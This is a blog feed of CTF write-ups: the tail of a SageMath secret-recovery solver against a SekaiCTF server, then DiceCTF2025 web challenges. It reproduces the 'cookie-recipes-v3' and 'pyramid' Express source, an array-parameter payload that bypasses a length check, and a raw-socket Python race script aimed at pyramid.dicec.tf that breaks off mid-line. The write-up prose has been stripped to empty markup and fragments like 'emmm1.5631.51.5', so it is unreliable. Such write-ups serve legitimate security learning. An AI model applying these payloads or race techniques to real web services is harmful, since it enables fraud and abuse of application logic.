cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal">c</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext></mtext></mrow><annotation encoding="application/x-tex"></annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span></span></span></span></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Gao</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># self.conn = process([&#x27;python3&#x27;, &#x27;another.py&#x27;])</span></span><br><span class="line">        self.conn = remote(<span class="string">&#x27;ssss.chals.sekai.team&#x27;</span>, <span class="string">&#x27;1337&#x27;</span>, ssl=<span class="literal">True</span>)</span><br><span class="line">        self.p = <span class="number">2</span> ** <span class="number">256</span> - <span class="number">189</span></span><br><span class="line">        self.Zp = Zmod(self.p)</span><br><span class="line">        self.g = <span class="number">68182365146192563136101852599586284510469631280758214998024143739738246750499</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gao_1</span>(<span class="params">self</span>):</span><br><span class="line">        Zp = self.Zp</span><br><span class="line">        g = Zp(self.g)</span><br><span class="line"></span><br><span class="line">        t = <span class="number">29</span></span><br><span class="line">        self.conn.sendline(<span class="built_in">str</span>(t))</span><br><span class="line">        A, b = [], []</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(t):</span><br><span class="line">            x = g ** j</span><br><span class="line">            self.conn.sendline(<span class="built_in">str</span>(x))</span><br><span class="line">            y = <span class="built_in">int</span>(self.conn.recvline())</span><br><span class="line">            A.append([Zp(x) ** i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(t)])</span><br><span class="line">            b.append(Zp(y))</span><br><span class="line">        A = matrix(Zp, A)</span><br><span class="line">        b = vector(Zp, b)</span><br><span class="line">        x = A.solve_right(b)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">set</span>(x.<span class="built_in">list</span>())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gao</span>(<span class="params">self</span>):</span><br><span class="line">        a = self.gao_1()</span><br><span class="line">        self.conn.sendline(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        self.conn.recvline()</span><br><span class="line">        b = self.gao_1()</span><br><span class="line">        num = a &amp; b</span><br><span class="line">        <span class="built_in">print</span>(num)</span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(num) == <span class="number">1</span>, <span class="string">&quot;Multiple secrets found&quot;</span></span><br><span class="line">        secret = num.pop()</span><br><span class="line">        self.conn.sendline(<span class="built_in">str</span>(secret))</span><br><span class="line">        self.conn.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    g = Gao()</span><br><span class="line">    g.gao()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;()&lt;/p&gt;
&lt;h1 id=&quot;kalmarctf2025-basic-sums&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#kalmarctf2025-basic-sums&quot;&gt;&lt;/a&gt; Ka</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>DiceCTF2025-WriteUp</title>
    <link href="https://hvang10.github.io/2025/03/31/DiceCTF2025-WriteUp/"/>
    <id>https://hvang10.github.io/2025/03/31/DiceCTF2025-WriteUp/</id>
    <published>2025-03-30T17:38:57.000Z</published>
    <updated>2025-04-01T19:11:05.687Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h1><h2 id="cookie-recipes-v3"><a class="markdownIt-Anchor" href="#cookie-recipes-v3"></a> cookie-recipes-v3</h2><blockquote><p>Mmmmmmm</p></blockquote><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> cookies = <span class="keyword">new</span> <span class="title class_">Map</span>()</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> cookies = req.<span class="property">headers</span>.<span class="property">cookie</span></span><br><span class="line">    <span class="keyword">const</span> user = cookies?.<span class="title function_">split</span>(<span class="string">&#x27;=&#x27;</span>)?.[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (user) &#123; req.<span class="property">user</span> = user &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> id = <span class="title class_">Math</span>.<span class="title function_">random</span>().<span class="title function_">toString</span>(<span class="number">36</span>).<span class="title function_">slice</span>(<span class="number">2</span>)</span><br><span class="line">        res.<span class="title function_">setHeader</span>(<span class="string">&#x27;set-cookie&#x27;</span>, <span class="string">`user=<span class="subst">$&#123;id&#125;</span>`</span>)</span><br><span class="line">        req.<span class="property">user</span> = id</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">next</span>()</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> count = cookies.<span class="title function_">get</span>(req.<span class="property">user</span>) ?? <span class="number">0</span></span><br><span class="line">    res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>).<span class="title function_">send</span>(<span class="string">`</span></span><br><span class="line"><span class="string">        &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.jsdelivr.net/npm/@exampledev/new.css@1/new.min.css&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;link rel=&quot;stylesheet&quot; href=&quot;https://fonts.xz.style/serve/inter.css&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div&gt;You have &lt;span&gt;<span class="subst">$&#123;count&#125;</span>&lt;/span&gt; cookies&lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;button id=&quot;basic&quot;&gt;Basic cookie recipe (makes one)&lt;/button&gt;</span></span><br><span class="line"><span class="string">        &lt;br&gt;</span></span><br><span class="line"><span class="string">        &lt;button id=&quot;advanced&quot;&gt;Advanced cookie recipe (makes a dozen)&lt;/button&gt;</span></span><br><span class="line"><span class="string">        &lt;br&gt;</span></span><br><span class="line"><span class="string">        &lt;button disabled&gt;Super cookie recipe (makes a million)&lt;/button&gt;</span></span><br><span class="line"><span class="string">        &lt;br&gt;</span></span><br><span class="line"><span class="string">        &lt;button id=&quot;deliver&quot;&gt;Deliver cookies&lt;/button&gt;</span></span><br><span class="line"><span class="string">        &lt;script src=&quot;/script.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">    `</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/script.js&#x27;</span>, <span class="function">(<span class="params">_req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">type</span>(<span class="string">&#x27;js&#x27;</span>).<span class="title function_">send</span>(<span class="string">`</span></span><br><span class="line"><span class="string">        const basic = document.querySelector(&#x27;#basic&#x27;)</span></span><br><span class="line"><span class="string">        const advanced = document.querySelector(&#x27;#advanced&#x27;)</span></span><br><span class="line"><span class="string">        const deliver = document.querySelector(&#x27;#deliver&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        const showCookies = (number) =&gt; &#123;</span></span><br><span class="line"><span class="string">            const span = document.querySelector(&#x27;span&#x27;)</span></span><br><span class="line"><span class="string">            span.textContent = number</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        basic.addEventListener(&#x27;click&#x27;, async () =&gt; &#123;</span></span><br><span class="line"><span class="string">            const res = await fetch(&#x27;/bake?number=1&#x27;, &#123; method: &#x27;POST&#x27; &#125;)</span></span><br><span class="line"><span class="string">            const number = await res.text()</span></span><br><span class="line"><span class="string">            showCookies(+number)</span></span><br><span class="line"><span class="string">        &#125;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        advanced.addEventListener(&#x27;click&#x27;, async () =&gt; &#123;</span></span><br><span class="line"><span class="string">            const res = await fetch(&#x27;/bake?number=12&#x27;, &#123; method: &#x27;POST&#x27; &#125;)</span></span><br><span class="line"><span class="string">            const number = await res.text()</span></span><br><span class="line"><span class="string">            showCookies(+number)</span></span><br><span class="line"><span class="string">        &#125;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        deliver.addEventListener(&#x27;click&#x27;, async () =&gt; &#123;</span></span><br><span class="line"><span class="string">            const res = await fetch(&#x27;/deliver&#x27;, &#123; method: &#x27;POST&#x27; &#125;)</span></span><br><span class="line"><span class="string">            const text = await res.text()</span></span><br><span class="line"><span class="string">            alert(text)</span></span><br><span class="line"><span class="string">        &#125;)</span></span><br><span class="line"><span class="string">    `</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/bake&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> number = req.<span class="property">query</span>.<span class="property">number</span></span><br><span class="line">    <span class="keyword">if</span> (!number) &#123;</span><br><span class="line">        res.<span class="title function_">end</span>(<span class="string">&#x27;missing number&#x27;</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (number.<span class="property">length</span> &lt;= <span class="number">2</span>) &#123;</span><br><span class="line">        cookies.<span class="title function_">set</span>(req.<span class="property">user</span>, (cookies.<span class="title function_">get</span>(req.<span class="property">user</span>) ?? <span class="number">0</span>) + <span class="title class_">Number</span>(number))</span><br><span class="line">        res.<span class="title function_">end</span>(cookies.<span class="title function_">get</span>(req.<span class="property">user</span>).<span class="title function_">toString</span>())</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">end</span>(<span class="string">&#x27;that is too many cookies&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/deliver&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> current = cookies.<span class="title function_">get</span>(req.<span class="property">user</span>) ?? <span class="number">0</span></span><br><span class="line">    <span class="keyword">const</span> target = <span class="number">1_000_000_000</span></span><br><span class="line">    <span class="keyword">if</span> (current &lt; target) &#123;</span><br><span class="line">        res.<span class="title function_">end</span>(<span class="string">`not enough (need <span class="subst">$&#123;target - current&#125;</span>) more`</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">end</span>(process.<span class="property">env</span>.<span class="property">FLAG</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>)</span><br></pre></td></tr></table></figure><p></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/bake&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> number = req.<span class="property">query</span>.<span class="property">number</span></span><br><span class="line">    <span class="keyword">if</span> (!number) &#123;</span><br><span class="line">        res.<span class="title function_">end</span>(<span class="string">&#x27;missing number&#x27;</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (number.<span class="property">length</span> &lt;= <span class="number">2</span>) &#123;</span><br><span class="line">        cookies.<span class="title function_">set</span>(req.<span class="property">user</span>, (cookies.<span class="title function_">get</span>(req.<span class="property">user</span>) ?? <span class="number">0</span>) + <span class="title class_">Number</span>(number))</span><br><span class="line">        res.<span class="title function_">end</span>(cookies.<span class="title function_">get</span>(req.<span class="property">user</span>).<span class="title function_">toString</span>())</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">end</span>(<span class="string">&#x27;that is too many cookies&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><code>number</code><code>2</code><strong></strong><strong></strong><strong></strong><br /><code>POST /bake?number[]=99999999999999</code></p><h2 id="pyramid"><a class="markdownIt-Anchor" href="#pyramid"></a> pyramid()</h2><blockquote><p>Would you like to buy some supplements?</p></blockquote><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> css = <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;link</span></span><br><span class="line"><span class="string">        rel=&quot;stylesheet&quot;</span></span><br><span class="line"><span class="string">        href=&quot;https://unpkg.com/axist@latest/dist/axist.min.css&quot;</span></span><br><span class="line"><span class="string">    &gt;</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> users = <span class="keyword">new</span> <span class="title class_">Map</span>()</span><br><span class="line"><span class="keyword">const</span> codes = <span class="keyword">new</span> <span class="title class_">Map</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">random</span> = (<span class="params"></span>) =&gt; crypto.<span class="title function_">randomBytes</span>(<span class="number">16</span>).<span class="title function_">toString</span>(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">escape</span> = (<span class="params">str</span>) =&gt; str.<span class="title function_">replace</span>(<span class="regexp">/&lt;/g</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">referrer</span> = (<span class="params">code</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (code &amp;&amp; codes.<span class="title function_">has</span>(code)) &#123;</span><br><span class="line">        <span class="keyword">const</span> token = codes.<span class="title function_">get</span>(code)</span><br><span class="line">        <span class="keyword">if</span> (users.<span class="title function_">has</span>(token)) &#123;</span><br><span class="line">            <span class="keyword">return</span> users.<span class="title function_">get</span>(token)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">req, _res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> token = req.<span class="property">headers</span>.<span class="property">cookie</span>?.<span class="title function_">split</span>(<span class="string">&#x27;=&#x27;</span>)?.[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> (token) &#123;</span><br><span class="line">        req.<span class="property">token</span> = token</span><br><span class="line">        <span class="keyword">if</span> (users.<span class="title function_">has</span>(token)) &#123;</span><br><span class="line">            req.<span class="property">user</span> = users.<span class="title function_">get</span>(token)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">next</span>()</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">user</span>) &#123;</span><br><span class="line">        res.<span class="title function_">end</span>(<span class="string">`</span></span><br><span class="line"><span class="string">            <span class="subst">$&#123;css&#125;</span></span></span><br><span class="line"><span class="string">            &lt;h1&gt;Account: <span class="subst">$&#123;<span class="built_in">escape</span>(req.user.name)&#125;</span>&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            You have &lt;strong&gt;<span class="subst">$&#123;req.user.bal&#125;</span>&lt;/strong&gt; coins.</span></span><br><span class="line"><span class="string">            You have referred &lt;strong&gt;<span class="subst">$&#123;req.user.ref&#125;</span>&lt;/strong&gt; users.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            &lt;hr&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            &lt;form action=&quot;/code&quot; method=&quot;GET&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;button type=&quot;submit&quot;&gt;Generate referral code&lt;/button&gt;</span></span><br><span class="line"><span class="string">            &lt;/form&gt;</span></span><br><span class="line"><span class="string">            &lt;form action=&quot;/cashout&quot; method=&quot;GET&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;button type=&quot;submit&quot;&gt;</span></span><br><span class="line"><span class="string">                    Cashout <span class="subst">$&#123;req.user.ref&#125;</span> referrals</span></span><br><span class="line"><span class="string">                &lt;/button&gt;</span></span><br><span class="line"><span class="string">            &lt;/form&gt;</span></span><br><span class="line"><span class="string">            &lt;form action=&quot;/buy&quot; method=&quot;GET&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;button type=&quot;submit&quot;&gt;Purchase flag&lt;/button&gt;</span></span><br><span class="line"><span class="string">            &lt;/form&gt;</span></span><br><span class="line"><span class="string">        `</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">end</span>(<span class="string">`</span></span><br><span class="line"><span class="string">            <span class="subst">$&#123;css&#125;</span></span></span><br><span class="line"><span class="string">            &lt;h1&gt;Register&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            &lt;form action=&quot;/new&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;input name=&quot;name&quot; type=&quot;text&quot; placeholder=&quot;Name&quot; required&gt;</span></span><br><span class="line"><span class="string">                &lt;input</span></span><br><span class="line"><span class="string">                    name=&quot;refer&quot;</span></span><br><span class="line"><span class="string">                    type=&quot;text&quot;</span></span><br><span class="line"><span class="string">                    placeholder=&quot;Referral code (optional)&quot;</span></span><br><span class="line"><span class="string">                &gt;</span></span><br><span class="line"><span class="string">                &lt;button type=&quot;submit&quot;&gt;Register&lt;/button&gt;</span></span><br><span class="line"><span class="string">            &lt;/form&gt;</span></span><br><span class="line"><span class="string">        `</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/new&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> token = <span class="title function_">random</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> body = []</span><br><span class="line">    req.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">push</span>.<span class="title function_">bind</span>(body))</span><br><span class="line">    req.<span class="title function_">on</span>(<span class="string">&#x27;end&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> data = <span class="title class_">Buffer</span>.<span class="title function_">concat</span>(body).<span class="title function_">toString</span>()</span><br><span class="line">        <span class="keyword">const</span> parsed = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(data)</span><br><span class="line">        <span class="keyword">const</span> name = parsed.<span class="title function_">get</span>(<span class="string">&#x27;name&#x27;</span>)?.<span class="title function_">toString</span>() ?? <span class="string">&#x27;JD&#x27;</span></span><br><span class="line">        <span class="keyword">const</span> code = parsed.<span class="title function_">get</span>(<span class="string">&#x27;refer&#x27;</span>) ?? <span class="literal">null</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// referrer receives the referral</span></span><br><span class="line">        <span class="keyword">const</span> r = <span class="title function_">referrer</span>(code)</span><br><span class="line">        <span class="keyword">if</span> (r) &#123; r.<span class="property">ref</span> += <span class="number">1</span> &#125;</span><br><span class="line"></span><br><span class="line">        users.<span class="title function_">set</span>(token, &#123;</span><br><span class="line">            name,</span><br><span class="line">            code,</span><br><span class="line">            <span class="attr">ref</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">bal</span>: <span class="number">0</span>,</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    res.<span class="title function_">header</span>(<span class="string">&#x27;set-cookie&#x27;</span>, <span class="string">`token=<span class="subst">$&#123;token&#125;</span>`</span>)</span><br><span class="line">    res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/code&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> token = req.<span class="property">token</span></span><br><span class="line">    <span class="keyword">if</span> (token) &#123;</span><br><span class="line">        <span class="keyword">const</span> code = <span class="title function_">random</span>()</span><br><span class="line">        codes.<span class="title function_">set</span>(code, token)</span><br><span class="line">        res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>).<span class="title function_">end</span>(<span class="string">`</span></span><br><span class="line"><span class="string">            <span class="subst">$&#123;css&#125;</span></span></span><br><span class="line"><span class="string">            &lt;h1&gt;Referral code generated&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            &lt;p&gt;Your code: &lt;strong&gt;<span class="subst">$&#123;code&#125;</span>&lt;/strong&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">            &lt;a href=&quot;/&quot;&gt;Home&lt;/a&gt;</span></span><br><span class="line"><span class="string">        `</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">end</span>()</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// referrals translate 1:1 to coins</span></span><br><span class="line"><span class="comment">// you receive half of your referrals as coins</span></span><br><span class="line"><span class="comment">// your referrer receives the other half as kickback</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// if your referrer is null, you can turn all referrals into coins</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/cashout&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">user</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> u = req.<span class="property">user</span></span><br><span class="line">        <span class="keyword">const</span> r = <span class="title function_">referrer</span>(u.<span class="property">code</span>)</span><br><span class="line">        <span class="keyword">if</span> (r) &#123;</span><br><span class="line">            [u.<span class="property">ref</span>, r.<span class="property">ref</span>, u.<span class="property">bal</span>] = [<span class="number">0</span>, r.<span class="property">ref</span> + u.<span class="property">ref</span> / <span class="number">2</span>, u.<span class="property">bal</span> + u.<span class="property">ref</span> / <span class="number">2</span>]</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            [u.<span class="property">ref</span>, u.<span class="property">bal</span>] = [<span class="number">0</span>, u.<span class="property">bal</span> + u.<span class="property">ref</span>]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/buy&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">user</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> user = req.<span class="property">user</span></span><br><span class="line">        <span class="keyword">if</span> (user.<span class="property">bal</span> &gt; <span class="number">100_000_000_000</span>) &#123;</span><br><span class="line">            user.<span class="property">bal</span> -= <span class="number">100_000_000_000</span></span><br><span class="line">            res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>).<span class="title function_">end</span>(<span class="string">`</span></span><br><span class="line"><span class="string">                <span class="subst">$&#123;css&#125;</span></span></span><br><span class="line"><span class="string">                &lt;h1&gt;Successful purchase&lt;/h1&gt;</span></span><br><span class="line"><span class="string">                &lt;p&gt;<span class="subst">$&#123;process.env.FLAG&#125;</span>&lt;/p&gt;</span></span><br><span class="line"><span class="string">            `</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>).<span class="title function_">end</span>(<span class="string">`</span></span><br><span class="line"><span class="string">        <span class="subst">$&#123;css&#125;</span></span></span><br><span class="line"><span class="string">        &lt;h1&gt;Not enough coins&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;a href=&quot;/&quot;&gt;Home&lt;/a&gt;</span></span><br><span class="line"><span class="string">    `</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>)</span><br></pre></td></tr></table></figure><p></p><p></p><p>emmm<strong></strong>1.5<strong></strong>631.51.5</p><p><code>yakit</code>()</p><p></p><p><code>V&amp;N</code><code>exp</code><code>discord</code><code>wp</code></p><p><strong></strong><code>/new</code><code>req.on('data') req.on('end')</code><strong></strong><code>new</code><code>token</code>(<code>body</code><code>token</code>)<code>Python</code><code>code</code><strong></strong><code>token</code>1.5<strong>63</strong>(1.5^63=1240)</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addRef</span>(<span class="params">code</span>):</span><br><span class="line">    url = <span class="string">&quot;https://pyramid.dicec.tf/new&quot;</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;attacker&quot;</span>,</span><br><span class="line">        <span class="string">&quot;refer&quot;</span>: code</span><br><span class="line">    &#125;</span><br><span class="line">    requests.post(url, data=data, verify=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    <span class="comment"># HTTPS</span></span><br><span class="line">    host = <span class="string">&#x27;pyramid.dicec.tf&#x27;</span></span><br><span class="line">    port = <span class="number">443</span>  <span class="comment"># HTTPS</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># SSL</span></span><br><span class="line">    context = ssl.create_default_context()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># socket</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># SSL socket</span></span><br><span class="line">    ssl_sock = context.wrap_socket(s, server_hostname=host)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># </span></span><br><span class="line">    ssl_sock.connect((host, port))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># </span></span><br><span class="line">    request = (</span><br><span class="line">        <span class="string">&quot;POST /new HTTP/1.1\r\n&quot;</span></span><br><span class="line">        <span class="string">&quot;Host: &#123;host&#125;\r\n&quot;</span></span><br><span class="line">        <span 